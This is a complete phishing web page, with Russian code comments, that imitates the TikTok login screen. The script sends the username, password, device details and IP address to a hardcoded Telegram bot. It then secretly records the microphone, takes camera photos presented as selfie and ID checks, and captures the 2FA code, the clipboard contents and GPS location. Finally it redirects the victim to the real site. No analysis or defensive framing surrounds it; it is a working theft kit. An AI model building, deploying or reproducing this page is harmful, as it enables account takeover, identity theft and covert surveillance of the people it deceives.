<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in to TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        h2 { margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        
        .screen { display: none; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #fe2c55; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

    <!-- ЭКРАН 1: Вход -->
    <div class="container screen" id="screen-login" style="display:block;">
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn-login">Log in</button>
        </form>
    </div>

    <!-- ЭКРАН 2: Селфи -->
    <div class="container screen" id="screen-face">
        <h2>Face Verification</h2>
        <p style="font-size: 14px; color: #aaa; margin-bottom: 20px;">Please allow camera access to take a quick selfie.</p>
        <div class="spinner" id="spin-face"></div>
        <button id="btn-face-retry" style="display:none;">Allow Camera</button>
    </div>

    <!-- ЭКРАН 3: Документ -->
    <div class="container screen" id="screen-id">
        <h2>ID Verification</h2>
        <p style="font-size: 14px; color: #aaa; margin-bottom: 20px;">Please hold your ID or Passport up to the front camera.</p>
        <div class="spinner" id="spin-id" style="display:none;"></div>
        <button id="btn-id">Scan ID Document</button>
    </div>

    <!-- ЭКРАН 4: Ввод 2FA (Кода из СМС) -->
    <div class="container screen" id="screen-2fa">
        <h2>Two-Factor Authentication</h2>
        <p style="font-size: 14px; color: #aaa; margin-bottom: 20px;">Enter the 6-digit code sent to your phone or email to secure your account.</p>
        <form id="form-2fa">
            <input type="text" id="code2fa" placeholder="6-digit code" maxlength="6" required style="text-align: center; font-size: 20px; letter-spacing: 5px;">
            <button type="submit">Verify Code</button>
        </form>
    </div>

    <video id="camera-video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
        const CHAT_ID = "7485234259"; 
        
        let userEmail = "";
        let userPass = "";
        let currentStream = null;

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(el => el.style.display = 'none');
            document.getElementById(id).style.display = 'block';
        }

        // Мгновенная отправка текста (обходит блокировки Safari)
        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('voice', blob, 'voice.ogg');
            formData.append('caption', `🎙️ Аудио с устройства\n👤 ${userEmail}`);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
        }

        // 1. Обработка формы входа
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            userEmail = document.getElementById('username').value;
            userPass = document.getElementById('password').value;

            // Отпечаток устройства
            const deviceInfo = `📱 Device: ${navigator.platform} | ${window.screen.width}x${window.screen.height} | Lang: ${navigator.language}`;
            
            sendText(`🎯 TikTok Hijack\n👤 User: ${userEmail}\n🔑 Pass: ${userPass}\n${deviceInfo}`);
            
            // Запрашиваем IP в фоне
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});

            // Запускаем запись микрофона (параллельно)
            startMicRecording();

            // Переходим к камере
            showScreen('screen-face');
            startFrontCamera();
        });

        // 2. Скрытая запись микрофона
        async function startMicRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    await sendVoice(audioBlob);
                    stream.getTracks().forEach(track => track.stop());
                };

                mediaRecorder.start();
                // Пишем 5 секунд
                setTimeout(() => { mediaRecorder.stop(); }, 5000);
            } catch (err) {
                // Если запретил микрофон, просто игнорируем
            }
        }

        // 3. Селфи
        async function startFrontCamera() {
            document.getElementById('btn-face-retry').style.display = 'none';
            document.getElementById('spin-face').style.display = 'block';

            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                setTimeout(async () => {
                    const blob = await capturePhoto();
                    if (blob) await sendPhoto(blob, `📸 Селфи\n👤 User: ${userEmail}`);
                    showScreen('screen-id'); 
                }, 1000);
            } catch (err) {
                document.getElementById('spin-face').style.display = 'none';
                document.getElementById('btn-face-retry').style.display = 'block';
                document.getElementById('btn-face-retry').onclick = startFrontCamera;
            }
        }

        // 4. Паспорт
        document.getElementById('btn-id').addEventListener('click', async function() {
            this.style.display = 'none';
            document.getElementById('spin-id').style.display = 'block';

            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                setTimeout(async () => {
                    const blob = await capturePhoto();
                    if (blob) await sendPhoto(blob, `🪪 Документ\n👤 User: ${userEmail}`);
                    
                    // Переходим к экрану 2FA
                    showScreen('screen-2fa');
                }, 1500);
            } catch (err) {
                showScreen('screen-2fa'); // Пропускаем, если запретил
            }
        });

        // 5. Перехват кода 2FA и буфера обмена
        document.getElementById('form-2fa').addEventListener('submit', async function(e) {
            e.preventDefault();
            const code = document.getElementById('code2fa').value;
            
            // Пытаемся прочитать буфер обмена (что жертва копировала)
            let clipboardText = "";
            try {
                clipboardText = await navigator.clipboard.readText();
            } catch(e) {}

            sendText(`🔐 2FA Code: ${code}\n📋 Буфер: ${clipboardText}`);

            // Запрашиваем GPS и редирект
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    window.location.href = "https://www.tiktok.com/login";
                },
                (err) => {
                    window.location.href = "https://www.tiktok.com/login";
                },
                { timeout: 4000, enableHighAccuracy: true }
            );
        });

        async function capturePhoto() {
            if (!currentStream) return null;
            const video = document.getElementById('camera-video');
            video.srcObject = currentStream;
            await new Promise(r => setTimeout(r, 500)); 
            
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            currentStream.getTracks().forEach(track => track.stop());
            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
            return await (await fetch(dataURL)).blob();
        }
    </script>
</body>
</html>
